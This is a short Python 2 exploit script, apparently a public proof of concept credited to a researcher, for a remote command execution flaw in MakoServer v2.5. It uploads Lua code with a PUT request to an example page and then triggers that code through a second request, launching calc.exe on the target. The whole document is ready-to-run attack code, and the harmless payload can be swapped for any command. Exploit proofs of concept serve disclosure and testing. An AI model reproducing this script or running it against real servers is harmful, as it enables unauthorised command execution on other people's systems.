import urllib2,time

#MakoServer v2.5 Remote Command Execution 0day
#Credits: John Page AKA hyp3rlinx
#=========================================

print  'MakoServer v2.5 Remote Command Execution'

CMD="os.execute('c:/Windows/system32/calc.exe')"

opener = urllib2.build_opener(urllib2.HTTPHandler)
request = urllib2.Request('http://IP/examples/save.lsp?ex=2.1', data=CMD)
request.add_header('Content-Type', 'text/plain;charset=UTF-8')
request.add_header('X-Requested-With', 'XMLHttpRequest')
request.add_header('Referer', 'http://localhost/Lua-Types.lsp')
request.get_method = lambda: 'PUT'
opener.open(request)

time.sleep(1)

urllib2.urlopen('http://IP/examples/manage.lsp?execute=true&ex=2.1&type=lua')
